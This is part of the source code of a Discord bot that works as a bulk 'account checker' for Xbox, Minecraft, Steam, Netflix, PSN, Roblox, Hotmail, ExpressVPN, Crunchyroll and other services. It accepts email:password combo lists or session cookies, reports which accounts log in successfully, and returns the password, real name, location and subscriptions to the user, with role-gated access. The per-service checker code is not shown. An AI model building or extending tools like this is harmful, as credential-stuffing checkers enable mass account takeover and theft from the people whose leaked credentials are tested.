    @ui.button(label="🎵 TikTok", style=discord.ButtonStyle.secondary, row=2)
    async def tiktok_button(self, interaction, button):
        await show_service_menu(interaction, "TikTok", TikTokChecker.check, is_cookie=False)

    @ui.button(label="🟣 Ubisoft", style=discord.ButtonStyle.blurple, row=2)
    async def ubisoft_button(self, interaction, button):
        await show_service_menu(interaction, "Ubisoft", UbisoftChecker.check, is_cookie=False)

    @ui.button(label="🛸 AirGPU", style=discord.ButtonStyle.blurple, row=2)
    async def airgpu_button(self, interaction, button):
        await show_service_menu(interaction, "AirGPU", AirGPUChecker.check, is_cookie=False)

    @ui.button(label="🔒 ExpressVPN", style=discord.ButtonStyle.success, row=3)
    async def expressvpn_button(self, interaction, button):
        await show_service_menu(interaction, "ExpressVPN", ExpressVPNChecker.check, is_cookie=False)

    @ui.button(label="⚔️ PUBG", style=discord.ButtonStyle.danger, row=3)
    async def pubg_button(self, interaction, button):
        await show_service_menu(interaction, "PUBG", PUBGChecker.check, is_cookie=False)

    @ui.button(label="🍿 Crunchyroll", style=discord.ButtonStyle.primary, row=3)
    async def crunchyroll_button(self, interaction, button):
        await show_service_menu(interaction, "Crunchyroll", CrunchyrollChecker.check, is_cookie=False)

    @ui.button(label="📊 Stats", style=discord.ButtonStyle.secondary, row=4)
    async def stats_button(self, interaction, button):
        embed = discord.Embed(
            title="📊 Bot Statistics",
            description=f"Uptime: {datetime.now() - bot.start_time}",
            color=COLORS["primary"]
        )
        embed.add_field(name="🟢 Services", value="13 Active", inline=True)
        embed.add_field(name="⚡ Latency", value=f"{round(bot.latency*1000)}ms", inline=True)
        embed.add_field(name="📈 Status", value="All systems operational", inline=False)
        embed.set_footer(text="👻lynx404t's Checker")
        await interaction.response.send_message(embed=embed, ephemeral=True)

    @ui.button(label="❌ Close", style=discord.ButtonStyle.danger, row=4)
    async def close_button(self, interaction, button):
        await interaction.response.send_message("👋 Menu closed.", ephemeral=True)
        self.stop()

# ---- Helpers to show menus ----
async def show_main_menu(interaction: discord.Interaction):
    embed = discord.Embed(
        title="👻lynx404t's Checker",
        description="**Welcome!** Select a service below.\n\n*All credits to lynx404*",
        color=COLORS["gradient_start"]
    )
    embed.add_field(
        name="📋 Available Services",
        value="🎮 Xbox Game Pass\n⛏️ Minecraft\n🕹️ Steam\n🎬 Netflix\n🎮 PSN\n⚔️ Roblox\n📧 Hotmail\n🎵 TikTok\n🟣 Ubisoft\n🛸 AirGPU\n🔒 ExpressVPN\n⚔️ PUBG\n🍿 Crunchyroll",
        inline=True
    )
    embed.add_field(
        name="⚡ Features",
        value="✅ Real API checks with proper login validation\n🔒 Private\n📊 Detailed results\n📤 Bulk file support\n📩 Results sent to your DMs",
        inline=True
    )
    embed.set_footer(text="👻lynx404t's Checker • v5.0 • Flawless login validation • Credits:lynx404T")
    view = MainMenuView()
    if interaction.response.is_done():
        await interaction.edit_original_response(embed=embed, view=view)
    else:
        await interaction.response.send_message(embed=embed, view=view)

async def show_service_menu(interaction: discord.Interaction, service_name: str, checker, is_cookie=False):
    embed = discord.Embed(
        title=f"🔹 {service_name}",
        description="Choose an action:",
        color=COLORS["primary"]
    )
    view = ServiceActionView(service_name, checker, is_cookie)
    await interaction.response.edit_message(embed=embed, view=view)

# ---- Embed builders ----
def create_cool_embed(title, result, icon_url):
    status = result.get('status', 'UNKNOWN')
    is_valid = result.get('valid', False)
    
    color_map = {
        'FULL_VALID': 0x57F287,
        'XBOX_VALID': 0xFEE75C,
        'XBOX_ONLY': 0xFEE75C,
        'LOCKED': 0xFFA500,
        'RATE_LIMITED': 0xFFA500,
        '2FA': 0xEB459E,
        'BANNED': 0xED4245,
        'BAD': 0xED4245,
        'ERROR': 0xED4245,
        'NO_PUBG': 0xFEE75C,
        'UNKNOWN': 0x808080
    }
    color = color_map.get(status, 0x808080)
    
    status_emoji = {
        'FULL_VALID': '✅',
        'XBOX_VALID': '✅',
        'XBOX_ONLY': '⚠️',
        'LOCKED': '🔒',
        'RATE_LIMITED': '⏱️',
        '2FA': '🔐',
        'BANNED': '🚫',
        'BAD': '❌',
        'ERROR': '⚠️',
        'NO_PUBG': '⚠️',
        'UNKNOWN': '❓'
    }
    emoji = status_emoji.get(status, '❓')
    
    embed = discord.Embed(
        title=f"🔷 **{title}**",
        description=result.get('message', "Check completed") if is_valid else "❌ **Check failed**",
        color=color,
        timestamp=datetime.utcnow()
    )
    embed.set_author(name="👻lynx404t's Checker", icon_url="https://cdn.discordapp.com/attachments/123456789/123456789/bot_icon.png")
    embed.set_thumbnail(url=icon_url)
    
    status_text = f"{emoji} **{status.replace('_', ' ').title()}**"
    if result.get('reason'):
        status_text += f"\n`{result.get('reason')}`"
    embed.add_field(name="📊 Status", value=status_text, inline=False)
    
    if is_valid and status in ['FULL_VALID', 'XBOX_VALID', 'XBOX_ONLY']:
        for key, value in result.items():
            if key in ['valid', 'status', 'reason', 'message']:
                continue
            if isinstance(value, dict):
                for subk, subv in value.items():
                    if subv:
                        embed.add_field(name=f"📌 {subk.capitalize()}", value=f"`{subv}`", inline=True)
            else:
                if value and value != 'N/A':
                    embed.add_field(name=f"📌 {key.replace('_', ' ').title()}", value=f"`{value}`", inline=True)
    
    embed.set_footer(text="👻lynx404t's Checker • Powered by real APIs • Credits:lynx404T")
    return embed

def create_xbox_gamepass_embed(email, password, result):
    status = result.get('status', 'UNKNOWN')
    is_valid = result.get('valid', False)
    
    color_map = {
        'FULL_VALID': 0x57F287,
        'XBOX_VALID': 0xFEE75C,
        'XBOX_ONLY': 0xFEE75C,
        'LOCKED': 0xFFA500,
        'RATE_LIMITED': 0xFFA500,
        '2FA': 0xEB459E,
        'BANNED': 0xED4245,
        'BAD': 0xED4245,
        'ERROR': 0xED4245,
        'UNKNOWN': 0x808080
    }
    color = color_map.get(status, 0x808080)
    
    status_emoji = {
        'FULL_VALID': '✅',
        'XBOX_VALID': '✅',
        'XBOX_ONLY': '⚠️',
        'LOCKED': '🔒',
        'RATE_LIMITED': '⏱️',
        '2FA': '🔐',
        'BANNED': '🚫',
        'BAD': '❌',
        'ERROR': '⚠️',
        'UNKNOWN': '❓'
    }
    emoji = status_emoji.get(status, '❓')
    
    embed = discord.Embed(
        title="🎮 **Xbox / Minecraft Account Check**",
        description=f"Checking: `{email}`",
        color=color,
        timestamp=datetime.utcnow()
    )
    embed.set_author(name="👻lynx404t's Checker", icon_url="https://cdn.discordapp.com/attachments/123456789/123456789/xbox_icon.png")
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/123456789/123456789/xbox_logo.png")
    
    status_text = f"{emoji} **{status.replace('_', ' ').title()}**"
    if result.get('reason'):
        status_text += f"\n`{result.get('reason')}`"
    embed.add_field(name="📊 Status", value=status_text, inline=False)
    
    if is_valid and status in ['FULL_VALID', 'XBOX_VALID']:
        embed.add_field(name="🏷️ Gamertag", value=f"`{result.get('gamertag', 'N/A')}`", inline=True)
        embed.add_field(name="🏅 Tier", value=f"`{result.get('tier', 'N/A')}`", inline=True)
        embed.add_field(name="⭐ Reputation", value=f"`{result.get('rep', 'N/A')}`", inline=True)
        
        if result.get('real_name') and result['real_name'] != 'N/A':
            embed.add_field(name="👤 Real Name", value=f"`{result.get('real_name')}`", inline=True)
        if result.get('location') and result['location'] != 'N/A':
            embed.add_field(name="📍 Location", value=f"`{result.get('location')}`", inline=True)
        
        if result.get('subscriptions'):
            subs_str = "\n".join(result['subscriptions'][:6])
            if len(result['subscriptions']) > 6:
                subs_str += f"\n... (+{len(result['subscriptions'])-6} more)"
            embed.add_field(name="🎫 Subscriptions", value=f"```{subs_str}```", inline=False)
        
        if result.get('mc_name') and result['mc_name'] != 'Not Set':
            embed.add_field(name="⛏️ Minecraft Name", value=f"`{result.get('mc_name')}`", inline=True)
            embed.add_field(name="🆔 UUID", value=f"`{result.get('uuid', 'N/A')}`", inline=True)
            embed.add_field(name="🎭 Capes", value=f"`{result.get('capes', 'None')}`", inline=True)
        
        if result.get('games') and result['games'] != 'None':
            embed.add_field(name="🎮 Game Library", value=f"```\n{result.get('games')}\n```", inline=False)
    
    embed.add_field(name="🔑 Password", value=f"`{password}`", inline=False)
    embed.set_footer(text="👻lynx404t's Checker • Only shows VALID on successful login • Credits:lynx404T")
    return embed

# ---- Slash command /check ----
@bot.tree.command(name="check", description="Open the main checker menu")
@role_required()
async def slash_check(interaction: discord.Interaction):
    await show_main_menu(interaction)

# ---- Channel management commands (owner only) ----
@bot.tree.command(name="setchannel", description="Set the allowed channel for the bot (owner only)")
@app_commands.default_permissions(administrator=True)
async def set_channel(interaction: discord.Interaction, channel: discord.TextChannel = None):
    if interaction.user.id != OWNER_ID:
        embed = discord.Embed(title="❌ Not authorized", color=0xff0000)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    global ALLOWED_CHANNEL_ID
    if channel is None:
        channel = interaction.channel
    ALLOWED_CHANNEL_ID = channel.id
    save_config()
    embed = discord.Embed(
        title="✅ Channel Set",
        description=f"Bot is now restricted to {channel.mention}.",
        color=0x00ff00
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="removechannel", description="Remove channel restriction (owner only)")
@app_commands.default_permissions(administrator=True)
async def remove_channel(interaction: discord.Interaction):
    if interaction.user.id != OWNER_ID:
        embed = discord.Embed(title="❌ Not authorized", color=0xff0000)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    global ALLOWED_CHANNEL_ID
    ALLOWED_CHANNEL_ID = None
    save_config()
    embed = discord.Embed(
        title="✅ Channel Restriction Removed",
        description="Bot can now be used in any channel.",
        color=0x00ff00
    )
    await interaction.response.send_message(embed=embed, ephemeral=True)

# ---- Access management commands (owner only) ----
@bot.tree.command(name="giveaccess", description="Give a user the BOSS role (owner only)")
@app_commands.default_permissions(administrator=True)
async def give_access(interaction: discord.Interaction, user: discord.Member):
    if interaction.user.id != OWNER_ID:
        embed = discord.Embed(title="❌ Not authorized", color=0xff0000)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    # Ensure the role exists
    role = await get_or_create_boss_role(interaction.guild)
    if role is None:
        embed = discord.Embed(title="❌ Error", description=f"Could not find or create the '{ALLOWED_ROLE_NAME}' role. Please check bot permissions.", color=0xff0000)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    if role in user.roles:
        embed = discord.Embed(title="ℹ️ Already Has Access", description=f"{user.mention} already has the `{ALLOWED_ROLE_NAME}` role.", color=0xfee75c)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    try:
        await user.add_roles(role, reason=f"Access granted by {interaction.user}")
        embed = discord.Embed(title="✅ Access Granted", description=f"{user.mention} now has the `{ALLOWED_ROLE_NAME}` role and can use the bot.", color=0x57F287)
        embed.set_footer(text="👻lynx404t's Checker")
        await interaction.response.send_message(embed=embed, ephemeral=True)
    except discord.Forbidden:
        embed = discord.Embed(title="❌ Permission Denied", description="I do not have permission to assign roles. Please check my role hierarchy.", color=0xff0000)
        await interaction.response.send_message(embed=embed, ephemeral=True)
    except Exception as e:
        embed = discord.Embed(title="❌ Error", description=f"An error occurred: {e}", color=0xff0000)
        await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="removeaccess", description="Remove the BOSS role from a user (owner only)")
@app_commands.default_permissions(administrator=True)
async def remove_access(interaction: discord.Interaction, user: discord.Member):
    if interaction.user.id != OWNER_ID:
        embed = discord.Embed(title="❌ Not authorized", color=0xff0000)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    role = discord.utils.get(interaction.guild.roles, name=ALLOWED_ROLE_NAME)
    if role is None:
        embed = discord.Embed(title="ℹ️ Role Not Found", description=f"The `{ALLOWED_ROLE_NAME}` role does not exist in this server.", color=0xfee75c)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    if role not in user.roles:
        embed = discord.Embed(title="ℹ️ No Access", description=f"{user.mention} does not have the `{ALLOWED_ROLE_NAME}` role.", color=0xfee75c)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    try:
        await user.remove_roles(role, reason=f"Access removed by {interaction.user}")
        embed = discord.Embed(title="✅ Access Removed", description=f"{user.mention} no longer has the `{ALLOWED_ROLE_NAME}` role.", color=0xED4245)
        embed.set_footer(text="👻lynx404t's Checker")
        await interaction.response.send_message(embed=embed, ephemeral=True)
    except discord.Forbidden:
        embed = discord.Embed(title="❌ Permission Denied", description="I do not have permission to remove roles.", color=0xff0000)
        await interaction.response.send_message(embed=embed, ephemeral=True)
    except Exception as e:
        embed = discord.Embed(title="❌ Error", description=f"An error occurred: {e}", color=0xff0000)
        await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="listaccess", description="List all users with the BOSS role (owner only)")
@app_commands.default_permissions(administrator=True)
async def list_access(interaction: discord.Interaction):
    if interaction.user.id != OWNER_ID:
        embed = discord.Embed(title="❌ Not authorized", color=0xff0000)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    role = discord.utils.get(interaction.guild.roles, name=ALLOWED_ROLE_NAME)
    if role is None:
        embed = discord.Embed(title="ℹ️ Role Not Found", description=f"The `{ALLOWED_ROLE_NAME}` role does not exist in this server.", color=0xfee75c)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    members = [member for member in interaction.guild.members if role in member.roles]
    if not members:
        embed = discord.Embed(title="ℹ️ No Members", description=f"No members currently have the `{ALLOWED_ROLE_NAME}` role.", color=0xfee75c)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    # Prepare a list of mentions
    member_mentions = [member.mention for member in members]
    # For long lists, we may need to paginate, but we'll show all in one field
    # If too long, truncate
    list_str = "\n".join(member_mentions)
    if len(list_str) > 4000:
        list_str = list_str[:3997] + "..."
    
    embed = discord.Embed(
        title=f"👥 Users with `{ALLOWED_ROLE_NAME}` role",
        description=list_str,
        color=0x5865F2
    )
    embed.set_footer(text=f"Total: {len(members)} users")
    await interaction.response.send_message(embed=embed, ephemeral=True)

# ---- On message for file uploads ----
@bot.event
async def on_message(message: discord.Message):
    if message.author.bot:
        return
    # Check channel restriction
    if not is_allowed_channel(message.channel.id):
        # Optionally silently ignore or notify
        return

    if message.content.lower() == "cancel":
        if message.author.id in pending_bulk:
            del pending_bulk[message.author.id]
            await message.channel.send("❌ Bulk check cancelled.", delete_after=5)
        return

    if message.author.id in pending_bulk and message.attachments:
        service_name, checker_func, is_cookie, interaction = pending_bulk[message.author.id]
        att = message.attachments[0]
        if not att.filename.endswith('.txt'):
            await message.channel.send("⚠️ Please upload a `.txt` file.", delete_after=5)
            return
        try:
            content = await att.read()
            text = content.decode('utf-8')
        except Exception as e:
            await message.channel.send(f"❌ Error reading file: {e}", delete_after=5)
            return

        if is_cookie:
            entries = [line.strip() for line in text.splitlines() if line.strip()]
            entries = [(e, None) for e in entries]
        else:
            entries = parse_combos(text)

        if not entries:
            await message.channel.send("❌ No valid entries found.", delete_after=5)
            return

        del pending_bulk[message.author.id]
        await message.channel.send(f"📤 Processing {len(entries)} entries... Results will be sent to your DMs.")
        await process_bulk(interaction, service_name, checker_func, entries, is_cookie)

    await bot.process_commands(message)

# ---- Sync command ----
@bot.tree.command(name="sync", description="Force sync slash commands (owner only)")
async def slash_sync(interaction: discord.Interaction):
    if interaction.user.id != OWNER_ID:
        embed = discord.Embed(title="❌ Not authorized", color=0xff0000)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    await interaction.response.defer(ephemeral=True)
    try:
        await bot.tree.sync()
        embed = discord.Embed(title="✅ Commands synced globally!", color=0x00ff00)
        await interaction.followup.send(embed=embed, ephemeral=True)
    except Exception as e:
        embed = discord.Embed(title="❌ Sync failed", description=str(e), color=0xff0000)
        await interaction.followup.send(embed=embed, ephemeral=True)

# ---- Help command ----
@bot.tree.command(name="help", description="Show how to use the bot")
async def slash_help(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🆘 Help -lynx404t's Checker",
        description="Use `/check` to open the main menu.\n\n"
                    "**Single Check** – enter one `email:password` (or cookie for Netflix).\n"
                    "**Bulk Check** – click the **Bulk Check (.txt)** button, then **upload a `.txt` file** in this channel.\n\n"
                    "**✅ Fixed:** Accounts now correctly show as VALID when they actually work.\n"
                    "**✅ Fixed:** No false 2FA detection — only shows 2FA when it's actually enabled.\n\n"
                    "Supported services: Xbox Game Pass, Minecraft, Steam, Netflix, PSN, Roblox, Hotmail, TikTok, Ubisoft, AirGPU, ExpressVPN, PUBG, Crunchyroll.\n\n"
                    "**Channel Restriction:** The bot can be restricted to a specific channel using `/setchannel` (owner only).\n"
                    "**Results:** All results are sent to your DMs for privacy.\n\n"
                    "**Access Management (Owner only):**\n"
                    "• `/giveaccess @user` – grants the BOSS role to a user\n"
                    "• `/removeaccess @user` – removes the BOSS role\n"
                    "• `/listaccess` – shows all users with the BOSS role\n\n"
                    "**Credits:** lynx404",
        color=COLORS["info"]
    )
    embed.set_footer(text="👻lynx404t's Checker • v5.0 • Flawless login validation • Credits:lynx404T")
    await interaction.response.send_message(embed=embed, ephemeral=True)

# ---- Whoami command ----
@bot.tree.command(name="whoami", description="Check your current roles and access status")
async def whoami(interaction: discord.Interaction):
    member = interaction.guild.get_member(interaction.user.id)
    if not member:
        embed = discord.Embed(title="❌ Error", description="Could not find your member data.", color=0xED4245)
        await interaction.response.send_message(embed=embed, ephemeral=True)
        return
    
    roles = [role.mention for role in member.roles if role.name != "@everyone"]
    has_access = has_required_role(interaction)
    
    embed = discord.Embed(
        title="👤 Your Access Status",
        description=f"User: {interaction.user.mention}",
        color=0x5865F2,
        timestamp=datetime.utcnow()
    )
    
    embed.add_field(name="📋 Your Roles", value=f"{', '.join(roles) if roles else 'None'}"[:1024], inline=False)
    embed.add_field(name="🔒 Required Role", value=f"`{ALLOWED_ROLE_NAME}`", inline=True)
    embed.add_field(name="✅ Access Status", value=f"{'✅ **You have access!**' if has_access else '❌ **Access Denied**'}", inline=True)
    
    if not has_access:
        embed.add_field(name="🔑 How to get access", value=f"Contact an admin to get the `{ALLOWED_ROLE_NAME}` role.\nAlternatively, ask the owner to use `/giveaccess`.", inline=False)
    
    embed.set_footer(text="👻lynx404's Checker • Credits:lynx404")
    await interaction.response.send_message(embed=embed, ephemeral=True)

# ---- Run ----
if __name__ == "__main__":
    try:
        bot.run(BOT_TOKEN)
    except discord.LoginFailure:
        print("❌ Invalid token.")
    except Exception as e:
        print(f"❌ Error: {e}")
